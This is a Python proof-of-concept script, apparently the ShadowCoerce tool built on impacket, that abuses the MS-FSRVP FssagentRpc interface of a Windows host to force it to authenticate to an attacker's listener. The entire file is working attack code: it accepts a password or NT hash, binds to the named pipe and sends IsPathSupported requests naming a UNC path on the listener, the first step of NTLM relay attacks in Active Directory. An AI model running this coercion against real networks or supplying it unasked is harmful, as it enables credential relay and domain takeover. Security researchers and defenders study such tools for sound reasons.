#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Author: Charlie BROMBERG aka Shutdown (@_nwodtuhs)
# Source : GILLES Lionel aka topotam (@topotam77) https://twitter.com/topotam77/status/1475701014204461056

import sys
import argparse
import logging
import traceback

from impacket import version, system_errors
from impacket.examples import logger
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

show_banner = "MS-FSRVP authentication coercion PoC\n"

MSFSRVP_ERROR_CODES = {
    0x80070005: ("E_ACCESSDENIED", "The caller does not have the permissions to perform the operation"),
    0x80070057: ("E_INVALIDARG", "One or more arguments are invalid."),
    0x80042301: ("FSRVP_E_BAD_STATE", "A method call was invalid because of the state of the server."),
    0x80042316: ("FSRVP_E_SHADOW_COPY_SET_IN_PROGRESS", "A call was made to either SetContext (Opnum 1) or StartShadowCopySet (Opnum 2) while the creation of another shadow copy set is in progress."),
    0x8004230C: ("FSRVP_E_NOT_SUPPORTED", "The file store that contains the share to be shadow copied is not supported by the server."),
    0x00000102: ("FSRVP_E_WAIT_TIMEOUT", "The wait for a shadow copy commit or expose operation has timed out."),
    0xFFFFFFFF: ("FSRVP_E_WAIT_FAILED", "The wait for a shadow copy commit expose operation has failed."),
    0x8004230D: ("FSRVP_E_OBJECT_ALREADY_EXISTS", "The specified object already exists."),
    0x80042308: ("FSRVP_E_OBJECT_NOT_FOUND", "The specified object does not exist."),
    0x8004231B: ("FSRVP_E_UNSUPPORTED_CONTEXT", "The specified context value is invalid."),
    0x80042501: ("FSRVP_E_SHADOWCOPYSET_ID_MISMATCH", "The provided ShadowCopySetId does not exist."),
}

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        error_messages = system_errors.ERROR_MESSAGES
        error_messages.update(MSFSRVP_ERROR_CODES)
        if key in error_messages:
            error_msg_short = error_messages[key][0]
            error_msg_verbose = error_messages[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code

class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ('ShareName', WSTR),
    )

class IsPathSupportedResponse(NDRCALL):
    structure = (
        ('SupportedByThisProvider', BOOL),
        ('OwnerMachineName', LPWSTR),
    )

class IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (
        ('ShareName', WSTR),
    )

class IsPathShadowCopiedResponse(NDRCALL):
    structure = (
        ('ShadowCopyPresent', BOOL),
        ('ShadowCopyCompatibility', LONG),
    )

OPNUMS = {
    8 : (IsPathSupported, IsPathSupportedResponse),
    9 : (IsPathShadowCopied, IsPathShadowCopiedResponse),
}

class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
        binding_params = {
            'FssagentRpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\FssagentRpc]' % target,
                'UUID': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        dce = rpctransport.get_dce_rpc()

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        dce.set_credentials(*rpctransport.get_credentials())
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        logging.info("Connecting to %s" % binding_params[pipe]['stringBinding'])
        try:
            dce.connect()
        except Exception as e:
            logging.error("Something went wrong, check error status => %s" % str(e))
            sys.exit()
        logging.info("Connected!")
        logging.info("Binding to %s" % binding_params[pipe]['UUID'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['UUID']))
        except Exception as e:
            logging.error("Something went wrong, check error status => %s" % str(e))
            sys.exit()
        logging.info("Successfully bound!")
        return dce

    def IsPathShadowCopied(self, dce, listener):
        logging.info("Sending IsPathShadowCopied!")
        try:
            request = IsPathShadowCopied()
            # only NETLOGON and SYSVOL were detected working here
            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            # request.dump()
            resp = dce.request(request)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            logging.info("Attack may of may not have worked, check your listener...")

    def IsPathSupported(self, dce, listener):
        logging.info("Sending IsPathSupported!")
        try:
            request = IsPathSupported()
            # only NETLOGON and SYSVOL were detected working here
            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            resp = dce.request(request)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            logging.info("Attack may of may not have worked, check your listener...")
            # logging.error(str(e))
            # raise

def init_logger(args):
    # Init the example's logger theme and debug level
    logger.init(args.ts)
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

def main():
    parser = argparse.ArgumentParser(add_help=True, description="MS-FSRVP authentication coercion PoC")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
    # parser.add_argument('-pipe', action="store", choices=['FssagentRpc'], default='FssagentRpc', help='Named pipe to use (default: FssagentRpc)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')
    options = parser.parse_args()

    init_logger(options)

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    print(show_banner)

    c = CoerceAuth()
    # dce = c.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=options.pipe)
    dce = c.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe="FssagentRpc")
    c.IsPathSupported(dce, options.listener)
    # c.IsPathShadowCopied(dce, options.listener)
    dce.disconnect()
    sys.exit()

if __name__ == '__main__':
    main()
